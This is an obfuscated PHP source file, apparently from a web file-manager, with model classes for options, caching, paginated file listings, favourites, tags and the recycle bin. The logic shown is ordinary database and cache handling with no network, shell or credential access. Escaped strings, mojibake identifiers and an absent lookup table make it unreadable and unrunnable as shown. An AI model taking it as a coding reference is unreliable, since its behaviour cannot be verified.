Bøò¾«¿¸â: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\x6d\117\160\x74\151\x6f\x6e"; public $field = array(); public function listData($Å—¤Åú² = false, $ú˜¬ëé¦ = "\155\157\144\151\146\171\124\x69\x6d\x65", $æ Äğâş = false) { $à³ÛÅ ó = Model($this->modelType)->get(!1, $this->optionType, !0); $¤ı¼¼“é = array_values($à³ÛÅ ó); if ($¤ı¼¼“é && $¤ı¼¼“é[0] && !is_array($¤ı¼¼“é[0])) { Model($this->modelType)->cacheRemove($this->optionType); $à³ÛÅ ó = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$à³ÛÅ ó) { return $Å—¤Åú² ? null : array(); } if (!$Å—¤Åú²) { $à³ÛÅ ó = array_filter(array_values($à³ÛÅ ó)); return array_sort_by($à³ÛÅ ó, $ú˜¬ëé¦, $æ Äğâş); } return $à³ÛÅ ó[$_SERVER[ˆûùúÊ¯][448] . $Å—¤Åú²]; } public function insert($áŸ«¥¶”) { $«†á¦½ =& $_SERVER[ˆûùúÊ¯]; $áŸ«¥¶” = array_field_key($áŸ«¥¶”, $this->field); $Á­Ïı‹ = Model($this->modelType)->get($«†á¦½[449], $this->optionType . $«†á¦½[450]); $Á­Ïı‹ = $Á­Ïı‹ ? $Á­Ïı‹ : 0; $áŸ«¥¶”[$«†á¦½[451]] = ++$Á­Ïı‹; $áŸ«¥¶”[$«†á¦½[224]] = time(); $áŸ«¥¶”[$«†á¦½[95]] = time(); Model($this->modelType)->set($«†á¦½[449], $Á­Ïı‹, $this->optionType . $«†á¦½[450]); Model($this->modelType)->set($«†á¦½[448] . $Á­Ïı‹, $áŸ«¥¶”, $this->optionType); return $Á­Ïı‹; } public function update($ÃÀòõÛ, $¯Îûíš) { $ÚÇ×İ–ò =& $_SERVER[ˆûùúÊ¯]; $¯Îûíš = array_field_key($¯Îûíš, $this->field); $úæøú¡Æ = $this->listData($ÃÀòõÛ); if (!$úæøú¡Æ || !$ÃÀòõÛ) { return !1; } $¯Îûíš = array_merge($úæøú¡Æ, $¯Îûíš); $¯Îûíš[$ÚÇ×İ–ò[95]] = time(); return Model($this->modelType)->set($ÚÇ×İ–ò[448] . $ÃÀòõÛ, $¯Îûíš, $this->optionType); } public function remove($¶î¾Å¤í) { if (!$¶î¾Å¤í) { return !1; } return Model($this->modelType)->remove($_SERVER[ˆûùúÊ¯][448] . $¶î¾Å¤í, $this->optionType); } public function clear() { $ÑšùµŸ =& $_SERVER[ˆûùúÊ¯]; Model($this->modelType)->remove($ÑšùµŸ[449], $this->optionType . $ÑšùµŸ[450]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($î²÷®‰ù, $É¥–é®À) { if (!$É¥–é®À) { return !1; } $á¬Š€Ûæ = $this->listData(); $á¬Š€Ûæ = array_to_keyvalue($á¬Š€Ûæ, $î²÷®‰ù); return isset($á¬Š€Ûæ[$É¥–é®À]) ? $á¬Š€Ûæ[$É¥–é®À] : !1; } public function findByName($ƒñâõ³ı) { return $this->findByKey($_SERVER[ˆûùúÊ¯][42], $ƒñâõ³ı); } protected function resetData($¿ÓœÙ¿±) { $ş¸¹‚İˆ =& $_SERVER[ˆûùúÊ¯]; $¿ÓœÙ¿± = is_array($¿ÓœÙ¿±) ? $¿ÓœÙ¿± : array(); $¢öàò¦í = array(); for ($¼½šœµ¶ = 0; $¼½šœµ¶ < count($¿ÓœÙ¿±); $¼½šœµ¶++) { $¢öàò¦í[$ş¸¹‚İˆ[448] . $¿ÓœÙ¿±[$¼½šœµ¶][$ş¸¹‚İˆ[451]]] = $¿ÓœÙ¿±[$¼½šœµ¶]; } return Model($this->modelType)->set($¢öàò¦í, !1, $this->optionType); } private function getAutoName($¨¬üÈÀ) { $Æê¦×ø‡ = array_to_keyvalue($this->listData(), $_SERVER[ˆûùúÊ¯][42]); if (!$Æê¦×ø‡ || !isset($Æê¦×ø‡[$¨¬üÈÀ])) { return $¨¬üÈÀ; } for ($£±èáƒŒ = 1; $£±èáƒŒ < count($Æê¦×ø‡); $£±èáƒŒ++) { $É¶Üº™š = $¨¬üÈÀ . "\50{$£±èáƒŒ}\x29"; if (!isset($Æê¦×ø‡[$É¶Üº™š])) { return $É¶Üº™š; } } return $É¶Üº™š; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¾ßå•áÎ = false, $ú®òÙ¯û = '', $»§¢­ = false) { $Œ‘ŞÏû =& $_SERVER[ˆûùúÊ¯]; $°´ŸÔÖ = $this->cacheGet($ú®òÙ¯û); $ş„òË Û = $this->optionDefault($ú®òÙ¯û); $ş„òË Û = is_array($ş„òË Û) ? $ş„òË Û : array(); if (is_array($°´ŸÔÖ)) { $°´ŸÔÖ = array_merge($ş„òË Û, $°´ŸÔÖ); return $¾ßå•áÎ ? isset($°´ŸÔÖ[$¾ßå•áÎ]) ? $°´ŸÔÖ[$¾ßå•áÎ] : null : $°´ŸÔÖ; } $ë€”ë‘ñ = $this->filterWhere(array($Œ‘ŞÏû[43] => $ú®òÙ¯û)); $°´ŸÔÖ = $this->where($ë€”ë‘ñ)->select(); $°´ŸÔÖ = array_to_keyvalue($°´ŸÔÖ, $Œ‘ŞÏû[104], $Œ‘ŞÏû[426]); foreach ($°´ŸÔÖ as $ùŠÖ³Ïî => $ğÃºªİÅ) { if ($»§¢­ || in_array($ùŠÖ³Ïî, $this->jsonField)) { $°´ŸÔÖ[$ùŠÖ³Ïî] = json_decode($ğÃºªİÅ, !0); } } $this->cacheSet($ú®òÙ¯û, $°´ŸÔÖ); $°´ŸÔÖ = array_merge($ş„òË Û, $°´ŸÔÖ); return $¾ßå•áÎ ? $°´ŸÔÖ[$¾ßå•áÎ] : $°´ŸÔÖ; } public function set($—İÕ¦ı, $ÉñÄ“© = false, $–®°ê‹ƒ = '') { $ƒÎÍ´Ãç =& $_SERVER[ˆûùúÊ¯]; $this->cacheRemove($–®°ê‹ƒ); $ƒ–‡‡¤ = array(); $Í¹œÓì¾ = is_array($—İÕ¦ı) ? $—İÕ¦ı : array($—İÕ¦ı => $ÉñÄ“©); foreach ($Í¹œÓì¾ as $Š£ÌÈ¦Ü => $õ½Ì“À–) { if (is_array($õ½Ì“À–)) { $õ½Ì“À– = json_encode_force($õ½Ì“À–); } $this->checkLength($õ½Ì“À–, !1, $this->tableName . $ƒÎÍ´Ãç[4] . $—İÕ¦ı); $õ½Ì“À– = self::textEncode($õ½Ì“À–); $Í¹œÓì¾ = array($ƒÎÍ´Ãç[43] => $–®°ê‹ƒ, $ƒÎÍ´Ãç[104] => $Š£ÌÈ¦Ü, $ƒÎÍ´Ãç[426] => $õ½Ì“À–); $ƒ–‡‡¤[] = $this->filterWhere($Í¹œÓì¾); } if (!$ƒ–‡‡¤) { return !0; } $å¸ìÉàÒ = $this->cacheKey($ƒÎÍ´Ãç[452]); CacheLock::lock($å¸ìÉàÒ); $Ø†¦ö = $this->addAll($ƒ–‡‡¤, array(), !0); CacheLock::unlock($å¸ìÉàÒ); return $Ø†¦ö; } protected function optionDefault($ß…Ûõ£§ = '') { return !1; } public function setDeep($æ«Íââ, $ıÀİ”‰‹ = false, $ı„ªÇı€ = '') { $¾±Ÿ¿“ä = explode($_SERVER[ˆûùúÊ¯][10], $æ«Íââ); $­˜û¡Æ = $this->get(); array_set_value($­˜û¡Æ, $æ«Íââ, $ıÀİ”‰‹); $this->set($¾±Ÿ¿“ä[0], $­˜û¡Æ[$¾±Ÿ¿“ä[0]], $ı„ªÇı€); } public function remove($á™êêÈ¨, $©Ëú°å¾ = '') { $¾ÈŞâ =& $_SERVER[ˆûùúÊ¯]; $this->cacheRemove($©Ëú°å¾); $‹ËÛñá = $this->filterWhere(array($¾ÈŞâ[104] => $á™êêÈ¨, $¾ÈŞâ[43] => $©Ëú°å¾)); if (is_null($á™êêÈ¨)) { unset($‹ËÛñá[$¾ÈŞâ[104]]); } return $this->where($‹ËÛñá)->delete(); } public function cacheSet($êÄØÎóØ, $‹ÑôºŒç = false) { return Cache::set($this->cacheKey($êÄØÎóØ), $‹ÑôºŒç); } public function cacheGet($É¤²šÅà) { return Cache::get($this->cacheKey($É¤²šÅà)); } public function cacheRemove($”Öğ‰èù) { return Cache::remove($this->cacheKey($”Öğ‰èù)); } protected function filterWhere($ªÍå¶Å) { return $ªÍå¶Å; } protected function cacheKey($ÂöõçøÔ) { return $ÂöõçøÔ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\143\x65"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\x61\155\x65" => "\151\157\137\163\157\x75\162\143\x65\137\155\x65\164\x61", "\155\x65\x74\141\106\x69\x65\x6c\144" => "\x73\157\x75\x72\143\x65\111\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\171\x54\151\155\145", "\164\151\155\145", "\151\x6e\x73\x65\x72\164", "\146\165\x6e\x63\x74\x69\157\156"), array("\x63\162\x65\141\164\x65\124\x69\155\145", "\164\x69\x6d\145", "\151\156\163\x65\162\164", "\x66\165\x6e\143\x74\x69\157\156"), array("\166\x69\145\x77\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\163\145\162\x74", "\146\165\156\x63\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($˜å‘´ùÖ) { return $this->listSource(array($_SERVER[ˆûùúÊ¯][453] => $˜å‘´ùÖ)); } public function typeName($öÔ¬ÈŞ¯) { static $×­ë™‹› = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\x72\157\x75\160"); return $×­ë™‹›[$öÔ¬ÈŞ¯ . $_SERVER[ˆûùúÊ¯][12]]; } public function sourceListInfo($æâ¶…­—, $ë„ğªõÖ = false) { $íÁ”ï„ =& $_SERVER[ˆûùúÊ¯]; $æâ¶…­— = $æâ¶…­— ? $æâ¶…­— : array(); $æâ¶…­— = array_filter(array_unique($æâ¶…­—)); if (!$æâ¶…­—) { return array(); } $ÓéÄ¯ìÅ = $this->where(array($íÁ”ï„[190] => array($íÁ”ï„[7], $æâ¶…­—)))->select(); $this->_listDataApply($ÓéÄ¯ìÅ, $ë„ğªõÖ); return array_to_keyvalue($ÓéÄ¯ìÅ, $íÁ”ï„[190]); } public function pathInfoFilter(&$ÕÔ’‘Í’) { $¦ùíÊÚÕ =& $_SERVER[ˆûùúÊ¯]; static $‡•¬ó = false; static $Ù†ö¼´´ = false; static $Ù¢ò€á = false; if (!$‡•¬ó) { $á»ŠÉÖ¬ = $¦ùíÊÚÕ[454]; $á»ŠÉÖ¬ .= $¦ùíÊÚÕ[455]; $á»ŠÉÖ¬ .= $¦ùíÊÚÕ[456]; $éè¥æ–õ = $¦ùíÊÚÕ[457]; $Ã¼´¬² = explode($¦ùíÊÚÕ[60], $éè¥æ–õ); $‡•¬ó = explode($¦ùíÊÚÕ[60], $á»ŠÉÖ¬); $Ù†ö¼´´ = array(); foreach ($‡•¬ó as $ù•…ÎÏ) { if (in_array($ù•…ÎÏ, $Ã¼´¬²)) { continue; } $Ù†ö¼´´[] = $ù•…ÎÏ; } $Ù¢ò€á = explode($¦ùíÊÚÕ[60], $¦ùíÊÚÕ[458]); } foreach ($Ù¢ò€á as $Ä®÷çÉÎ) { if (isset($ÕÔ’‘Í’[$Ä®÷çÉÎ])) { $ÕÔ’‘Í’[$Ä®÷çÉÎ] = intval($ÕÔ’‘Í’[$Ä®÷çÉÎ]); } } $ÕÔ’‘Í’[$¦ùíÊÚÕ[94]] = $¦ùíÊÚÕ[459] . $ÕÔ’‘Í’[$¦ùíÊÚÕ[190]] . $¦ùíÊÚÕ[460]; $ÕÔ’‘Í’[$¦ùíÊÚÕ[43]] = $ÕÔ’‘Í’[$¦ùíÊÚÕ[461]] == 1 ? $¦ùíÊÚÕ[85] : $¦ùíÊÚÕ[223]; $ÕÔ’‘Í’[$¦ùíÊÚÕ[187]] = $this->typeName($ÕÔ’‘Í’[$¦ùíÊÚÕ[187]]); if ($ÕÔ’‘Í’[$¦ùíÊÚÕ[461]] != 1) { $ÕÔ’‘Í’[$¦ùíÊÚÕ[184]] = $ÕÔ’‘Í’[$¦ùíÊÚÕ[462]]; unset($ÕÔ’‘Í’[$¦ùíÊÚÕ[462]]); } $¼õï¨´ = $‡•¬ó; if (isset($ÕÔ’‘Í’[$¦ùíÊÚÕ[463]]) && $ÕÔ’‘Í’[$¦ùíÊÚÕ[463]][$¦ùíÊÚÕ[464]] == -1) { $¼õï¨´ = $Ù†ö¼´´; } $ÕÔ’‘Í’ = array_field_key($ÕÔ’‘Í’, $¼õï¨´); return $ÕÔ’‘Í’; } public function listUserFav() { $¤Ñ…¢Ìª =& $_SERVER[ˆûùúÊ¯]; $×®ªöŒÄ = Model($¤Ñ…¢Ìª[465])->listData(); $Á×”éÒ = array_filter_by_field($×®ªöŒÄ, $¤Ñ…¢Ìª[43], $¤Ñ…¢Ìª[466]); $Á×”éÒ = array_to_keyvalue($Á×”éÒ, $¤Ñ…¢Ìª[12], $¤Ñ…¢Ìª[94]); if ($Á×”éÒ) { $¦ßëù‰ = $this->listSource(array($¤Ñ…¢Ìª[467] => array($¤Ñ…¢Ìª[468], $Á×”éÒ))); } $¦ßëù‰ = array_to_keyvalue($¦ßëù‰[$¤Ñ…¢Ìª[421]], $¤Ñ…¢Ìª[190]); foreach ($×®ªöŒÄ as &$«ÊöË½Ò) { $«ÊöË½Ò = array($¤Ñ…¢Ìª[469] => $«ÊöË½Ò[$¤Ñ…¢Ìª[451]], $¤Ñ…¢Ìª[470] => $«ÊöË½Ò[$¤Ñ…¢Ìª[42]], $¤Ñ…¢Ìª[471] => $«ÊöË½Ò[$¤Ñ…¢Ìª[94]], $¤Ñ…¢Ìª[472] => $«ÊöË½Ò[$¤Ñ…¢Ìª[43]], $¤Ñ…¢Ìª[473] => $«ÊöË½Ò[$¤Ñ…¢Ìª[224]], $¤Ñ…¢Ìª[474] => $«ÊöË½Ò[$¤Ñ…¢Ìª[95]]); if ($«ÊöË½Ò[$¤Ñ…¢Ìª[43]] == $¤Ñ…¢Ìª[466] && $¦ßëù‰[$«ÊöË½Ò[$¤Ñ…¢Ìª[94]]]) { $«ÊöË½Ò[$¤Ñ…¢Ìª[97]] = $¦ßëù‰[$«ÊöË½Ò[$¤Ñ…¢Ìª[94]]]; } } unset($«ÊöË½Ò); return $×®ªöŒÄ; } public function listUserTag($î’É¥Î) { $Ñ“¸ı»‡ =& $_SERVER[ˆûùúÊ¯]; if ($î’É¥Î && !is_array($î’É¥Î)) { $î’É¥Î = array($î’É¥Î); } $„”Õê = Model($Ñ“¸ı»‡[475])->listData(); $„Ôóá–õ = array(); $·¶£ë‡í = array(); foreach ($„”Õê as $Ä˜áËÏ¥) { $ Ó”Íäï = $Ä˜áËÏ¥[$Ñ“¸ı»‡[94]]; if (!$ Ó”Íäï) { continue; } if (!isset($·¶£ë‡í[$ Ó”Íäï])) { $·¶£ë‡í[$ Ó”Íäï] = array(); } $·¶£ë‡í[$ Ó”Íäï][] = $Ä˜áËÏ¥[$Ñ“¸ı»‡[476]]; $„Ôóá–õ[$Ä˜áËÏ¥[$Ñ“¸ı»‡[94]]] = $Ä˜áËÏ¥; } $˜ÙÕÎ‡ƒ = array(); $Æ°æ–·İ = array(); $Ó°ëí”Æ = array(); foreach ($·¶£ë‡í as $úéİ¹À => $ò©Ã×·–) { $Ì…æ˜Ú› = !0; if (!$î’É¥Î) { $˜ÙÕÎ‡ƒ[] = $úéİ¹À; continue; } foreach ($î’É¥Î as $¸°à†—ç) { if (!in_array($¸°à†—ç, $ò©Ã×·–)) { $Ì…æ˜Ú› = !1; break; } } if (!$Ì…æ˜Ú›) { continue; } if (!is_numeric($úéİ¹À)) { $šÆä½Ã = $„Ôóá–õ[$úéİ¹À]; $Àî˜Ê¯Ô = array($Ñ“¸ı»‡[42] => $šÆä½Ã[$Ñ“¸ı»‡[42]], $Ñ“¸ı»‡[94] => $šÆä½Ã[$Ñ“¸ı»‡[94]], $Ñ“¸ı»‡[43] => $šÆä½Ã[$Ñ“¸ı»‡[43]], $Ñ“¸ı»‡[97] => array($Ñ“¸ı»‡[477] => 1), $Ñ“¸ı»‡[225] => !0); if ($šÆä½Ã[$Ñ“¸ı»‡[43]] == $Ñ“¸ı»‡[223]) { $Ó°ëí”Æ[] = $Àî˜Ê¯Ô; } if ($šÆä½Ã[$Ñ“¸ı»‡[43]] == $Ñ“¸ı»‡[85]) { $Æ°æ–·İ[] = $Àî˜Ê¯Ô; } continue; } $˜ÙÕÎ‡ƒ[] = $úéİ¹À; } if ($˜ÙÕÎ‡ƒ) { $ıú™Š¨‡ = $this->listSource(array($Ñ“¸ı»‡[467] => array($Ñ“¸ı»‡[468], $˜ÙÕÎ‡ƒ))); } $ıú™Š¨‡ = $ıú™Š¨‡ ? $ıú™Š¨‡ : array($Ñ“¸ı»‡[92] => array(), $Ñ“¸ı»‡[93] => array()); $ıú™Š¨‡[$Ñ“¸ı»‡[92]] = array_merge($ıú™Š¨‡[$Ñ“¸ı»‡[92]], $Æ°æ–·İ); $ıú™Š¨‡[$Ñ“¸ı»‡[93]] = array_merge($ıú™Š¨‡[$Ñ“¸ı»‡[93]], $Ó°ëí”Æ); if (isset($ıú™Š¨‡[$Ñ“¸ı»‡[418]]) && count($˜ÙÕÎ‡ƒ) == $ıú™Š¨‡[$Ñ“¸ı»‡[418]][$Ñ“¸ı»‡[419]]) { return $ıú™Š¨‡; } $àË°Š»™ = array(); $’ğòğÜÕ = array_to_keyvalue($ıú™Š¨‡[$Ñ“¸ı»‡[92]], $Ñ“¸ı»‡[12], $Ñ“¸ı»‡[190]); $û­üëŸ = array_to_keyvalue($ıú™Š¨‡[$Ñ“¸ı»‡[93]], $Ñ“¸ı»‡[12], $Ñ“¸ı»‡[190]); $ËÉùï¦³ = array_merge($û­üëŸ, $’ğòğÜÕ); foreach ($˜ÙÕÎ‡ƒ as $ Ó”Íäï) { if (!in_array($ Ó”Íäï, $ËÉùï¦³)) { $àË°Š»™[] = $ Ó”Íäï; } } if ($àË°Š»™) { Model($Ñ“¸ı»‡[478])->removeBySource($àË°Š»™); } return $ıú™Š¨‡; } public function listUserRecycle() { $‘‚˜Üã™ =& $_SERVER[ˆûùúÊ¯]; $ˆ£Ë‹Š´ = Model($‘‚˜Üã™[479])->listData(); if (!$ˆ£Ë‹Š´) { return array(); } $€Æ¨´Öà = array($‘‚˜Üã™[467] => array($‘‚˜Üã™[468], $ˆ£Ë‹Š´), $‘‚˜Üã™[480] => 1); return $this->listSource($€Æ¨´Öà); } public function listSource($Á¸‹ÑŸÁ, $¶ûÕ¯’ = 3000, $»Ïêİ™© = false) { $’ôå˜èî =& $_SERVER[ˆûùúÊ¯]; if (!isset($Á¸‹ÑŸÁ[$’ôå˜èî[481]])) { $Á¸‹ÑŸÁ[$’ôå˜èî[481]] = 0; } if (isset($Á¸‹ÑŸÁ[$’ôå˜èî[189]]) && $Á¸‹ÑŸÁ[$’ôå˜èî[189]] == $’ôå˜èî[221]) { $Á¸‹ÑŸÁ[$’ôå˜èî[462]] = array($’ôå˜èî[383], $’ôå˜èî[482]); } $Î©ğĞâ = $’ôå˜èî[483]; $û¸Âõ˜¬ = $this->field($Î©ğĞâ)->_makeOrder()->where($Á¸‹ÑŸÁ)->selectPage($¶ûÕ¯’); $this->_listPageCheck($û¸Âõ˜¬, $Î©ğĞâ, $Á¸‹ÑŸÁ); $this->_listDataApply($û¸Âõ˜¬[$’ôå˜èî[421]], $»Ïêİ™©); $this->_listMake($û¸Âõ˜¬); return $û¸Âõ˜¬; } private function _listPageCheck(&$÷ŠÒ¯­£, $ñùÖ—„ö, $Ï’¶§) { $ßã­Ê¦ø =& $_SERVER[ˆûùúÊ¯]; if (!is_array($÷ŠÒ¯­£[$ßã­Ê¦ø[418]])) { return; } $³ˆ¸ìå™ = $÷ŠÒ¯­£[$ßã­Ê¦ø[418]]; if ($³ˆ¸ìå™[$ßã­Ê¦ø[420]] <= 1) { return; } if ($³ˆ¸ìå™[$ßã­Ê¦ø[419]] >= 100000) { return; } if (Model($ßã­Ê¦ø[484])->get($ßã­Ê¦ø[485]) != $ßã­Ê¦ø[486]) { return; } $ñùÖ—„ö = str_replace(array($ßã­Ê¦ø[63], $ßã­Ê¦ø[394], $ßã­Ê¦ø[18]), $ßã­Ê¦ø[12], $ñùÖ—„ö); $ñùÖ—„ö = $ßã­Ê¦ø[487] . str_replace($ßã­Ê¦ø[60], $ßã­Ê¦ø[488], $ñùÖ—„ö) . $ßã­Ê¦ø[489]; $îÜÉÛ ¾ = $ßã­Ê¦ø[490]; $îÜÉÛ ¾ = $îÜÉÛ ¾ . $ßã­Ê¦ø[491]; $şµé÷ì¿ = $³ˆ¸ìå™[$ßã­Ê¦ø[415]] * ($³ˆ¸ìå™[$ßã­Ê¦ø[405]] - 1) . $ßã­Ê¦ø[60] . $³ˆ¸ìå™[$ßã­Ê¦ø[415]]; $Éşàú§İ = $this->_makeOrder(!0); $ö·±ç = $ßã­Ê¦ø[487] . str_replace($ßã­Ê¦ø[60], $ßã­Ê¦ø[488], $Éşàú§İ[0]); if (strpos($ö·±ç, $ßã­Ê¦ø[492])) { $ö·±ç = str_replace($ßã­Ê¦ø[492], $ßã­Ê¦ø[493], $ö·±ç); } else { $ö·±ç .= $ßã­Ê¦ø[494] . $Éşàú§İ[1]; } $‚ØŸ‰¥ì = array(); foreach ($Ï’¶§ as $—àÕËß“ => $­“­íÃÓ) { $‚ØŸ‰¥ì[$ßã­Ê¦ø[487] . $—àÕËß“] = $­“­íÃÓ; } $this->alias($ßã­Ê¦ø[495])->field($ñùÖ—„ö)->limit($şµé÷ì¿)->order($ö·±ç); $Ç½ì©Ï‹ = $this->join($îÜÉÛ ¾)->where($‚ØŸ‰¥ì)->select(); if ($Ç½ì©Ï‹) { $÷ŠÒ¯­£[$ßã­Ê¦ø[421]] = $Ç½ì©Ï‹; } } protected function _makeOrder($Ù…Ã—¡ = false) { $“¾şØ®¦ =& $_SERVER[ˆûùúÊ¯]; $òşÂÌ = Model($“¾şØ®¦[496])->get($“¾şØ®¦[497]); $–‰è›“ß = Model($“¾şØ®¦[496])->get($“¾şØ®¦[498]); $É´Ñºç = array($“¾şØ®¦[499] => $“¾şØ®¦[500], $“¾şØ®¦[501] => $“¾şØ®¦[502]); $ş°ì¿Šï = array($“¾şØ®¦[42] => $“¾şØ®¦[42], $“¾şØ®¦[86] => $“¾şØ®¦[86], $“¾şØ®¦[184] => $“¾şØ®¦[462], $“¾şØ®¦[503] => $“¾şØ®¦[503], $“¾şØ®¦[504] => $“¾şØ®¦[505], $“¾şØ®¦[224] => $“¾şØ®¦[224], $“¾şØ®¦[95] => $“¾şØ®¦[95]); $Ö›ô½ëÕ = Input::get($“¾şØ®¦[506], $“¾şØ®¦[7], $òşÂÌ, array_keys($ş°ì¿Šï)); $ÅÁüÅ¦ = Input::get($“¾şØ®¦[507], $“¾şØ®¦[7], $–‰è›“ß, array_keys($É´Ñºç)); if (!in_array($Ö›ô½ëÕ, array_keys($ş°ì¿Šï))) { $Ö›ô½ëÕ = $“¾şØ®¦[42]; } if (!in_array($ÅÁüÅ¦, array_keys($É´Ñºç))) { $Ö›ô½ëÕ = $“¾şØ®¦[499]; } if ($Ö›ô½ëÕ == $“¾şØ®¦[42]) { } $íÚ‹„äô = $“¾şØ®¦[508] . $ş°ì¿Šï[$Ö›ô½ëÕ] . $“¾şØ®¦[63] . $É´Ñºç[$ÅÁüÅ¦]; $íÚ‹„äô = rtrim(trim($íÚ‹„äô), $“¾şØ®¦[60]); if ($Ù…Ã—¡) { return array($íÚ‹„äô, $É´Ñºç[$ÅÁüÅ¦]); } return $this->order($íÚ‹„äô); } protected function _listDataApplyItem($ÅÈ¶Ï­‰, $äß­Ò× = false) { $Ò§Øèà = array($ÅÈ¶Ï­‰); $this->_listDataApply($Ò§Øèà, $äß­Ò×); return $Ò§Øèà[0]; } protected function _listDataApply(&$ÚïÑ‰±Ç, $±áöü = false) { $®Òó’ğö =& $_SERVER[ˆûùúÊ¯]; if (!$ÚïÑ‰±Ç) { $ÚïÑ‰±Ç = array(); return; } $É·â¾úé = array_to_keyvalue($ÚïÑ‰±Ç, $®Òó’ğö[12], $®Òó’ğö[190]); $É·â¾úé = array_unique($É·â¾úé); $this->_listSourceCache($ÚïÑ‰±Ç); if (!$±áöü) { $this->_listAppendMeta($ÚïÑ‰±Ç, $É·â¾úé); $this->_listAppendFileMeta($ÚïÑ‰±Ç, $É·â¾úé); $this->_listAppendChildren($ÚïÑ‰±Ç, $É·â¾úé); } $this->_listAppendPath($ÚïÑ‰±Ç); $this->_listAppendAuth($ÚïÑ‰±Ç); $this->_listAppendSourceInfo($ÚïÑ‰±Ç, $É·â¾úé); $this->_listAppendUser($ÚïÑ‰±Ç); $this->_listFilterInfo($ÚïÑ‰±Ç, $±áöü); $this->_listAppendAuthSecret($ÚïÑ‰±Ç); } protected function _listSourceCache($€ù¶ÄÓü) { $Ú‰©Ï˜ö =& $_SERVER[ˆûùúÊ¯]; foreach ($€ù¶ÄÓü as $‘ïö¾ÕÚ) { self::$cacheSourceInfo[$Ú‰©Ï˜ö[509] . $‘ïö¾ÕÚ[$Ú‰©Ï˜ö[190]]] = $‘ïö¾ÕÚ; } } protected function _listFilterInfo(&$‹ïûÁÒÀ, $ŒˆšÕ§ó = false) { $“Ñš”ãÀ =& $_SERVER[ˆûùúÊ¯]; foreach ($‹ïûÁÒÀ as &$µ›ëæŞû) { $µ›ëæŞû = $this->pathInfoFilter($µ›ëæŞû); self::$cachePathInfo[$“Ñš”ãÀ[510] . intval($ŒˆšÕ§ó) . $“Ñš”ãÀ[438] . $µ›ëæŞû[$“Ñš”ãÀ[190]]] = $µ›ëæŞû; } unset($µ›ëæŞû); } protected function _listMake(&$ÉÜøÑğ¢) { $ÆòÂ²âè =& $_SERVER[ˆûùúÊ¯]; $ÉÜøÑğ¢[$ÆòÂ²âè[92]] = array(); $ÉÜøÑğ¢[$ÆòÂ²âè[93]] = array(); foreach ($ÉÜøÑğ¢[$ÆòÂ²âè[421]] as $»„Ò­ïÍ) { $©İÛå™Š = $»„Ò­ïÍ[$ÆòÂ²âè[461]] == 1 ? $ÆòÂ²âè[92] : $ÆòÂ²âè[93]; $ÉÜøÑğ¢[$©İÛå™Š][] = $»„Ò­ïÍ; } unset($ÉÜøÑğ¢[$ÆòÂ²âè[421]]); } protected function _listAppendMeta(&$—Î‘¶ˆ†, $ŠÎ˜àüŞ) { $ßÑ’§ˆ› =& $_SERVER[ˆûùúÊ¯]; $²‚ã·×‘ = array($ßÑ’§ˆ›[467] => array($ßÑ’§ˆ›[468], $ŠÎ˜àüŞ)); $é‘×é¤ = Model($ßÑ’§ˆ›[511])->field($ßÑ’§ˆ›[512])->where($²‚ã·×‘)->select(); if (!$é‘×é¤) { return; } $ëÂ£œÄı = array($ßÑ’§ˆ›[513], $ßÑ’§ˆ›[514], $ßÑ’§ˆ›[493]); $‰ãØ‘ë = array(); foreach ($é‘×é¤ as $ªÏ©ºìÇ) { if (!isset($‰ãØ‘ë[$ªÏ©ºìÇ[$ßÑ’§ˆ›[190]]])) { $‰ãØ‘ë[$ªÏ©ºìÇ[$ßÑ’§ˆ›[190]]] = array(); } if (in_array($ªÏ©ºìÇ[$ßÑ’§ˆ›[104]], $ëÂ£œÄı)) { continue; } $‰ãØ‘ë[$ªÏ©ºìÇ[$ßÑ’§ˆ›[190]]][$ªÏ©ºìÇ[$ßÑ’§ˆ›[104]]] = $ªÏ©ºìÇ[$ßÑ’§ˆ›[426]]; } foreach ($—Î‘¶ˆ† as &$œÆİ¦ø°) { $œÆİ¦ø°[$ßÑ’§ˆ›[515]] = !1; if (isset($‰ãØ‘ë[$œÆİ¦ø°[$ßÑ’§ˆ›[190]]])) { $œÆİ¦ø°[$ßÑ’§ˆ›[515]] = $‰ãØ‘ë[$œÆİ¦ø°[$ßÑ’§ˆ›[190]]]; } if ($this->fileIsLock($œÆİ¦ø°) && $œÆİ¦ø°[$ßÑ’§ˆ›[463]]) { $Ç¤é„Œ› = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $œÆİ¦ø°[$ßÑ’§ˆ›[463]][$ßÑ’§ˆ›[464]] = AuthModel::authDisable($œÆİ¦ø°[$ßÑ’§ˆ›[463]][$ßÑ’§ˆ›[464]], $Ç¤é„Œ›); $œÆİ¦ø°[$ßÑ’§ˆ›[463]][$ßÑ’§ˆ›[516]][$ßÑ’§ˆ›[463]] = $œÆİ¦ø°[$ßÑ’§ˆ›[463]][$ßÑ’§ˆ›[464]]; } } unset($œÆİ¦ø°); } protected function _listAppendFileMeta(&$àÜ‹€­İ, $Û¶İÙ×´) { $Ñ¶¥îî =& $_SERVER[ˆûùúÊ¯]; $ÚóÀğ¸… = array_to_keyvalue($àÜ‹€­İ, $Ñ¶¥îî[12], $Ñ¶¥îî[517]); $ÚóÀğ¸… = array_filter(array_unique($ÚóÀğ¸…)); if (!$ÚóÀğ¸…) { return; } $©£ø­Í = array($Ñ¶¥îî[518] => array($Ñ¶¥îî[468], $ÚóÀğ¸…)); $ñû‡Âı = $Ñ¶¥îî[519]; $’é×é† = Model($Ñ¶¥îî[520])->field($ñû‡Âı)->where($©£ø­Í)->select(); $’é×é† = array_to_keyvalue($’é×é†, $Ñ¶¥îî[517]); 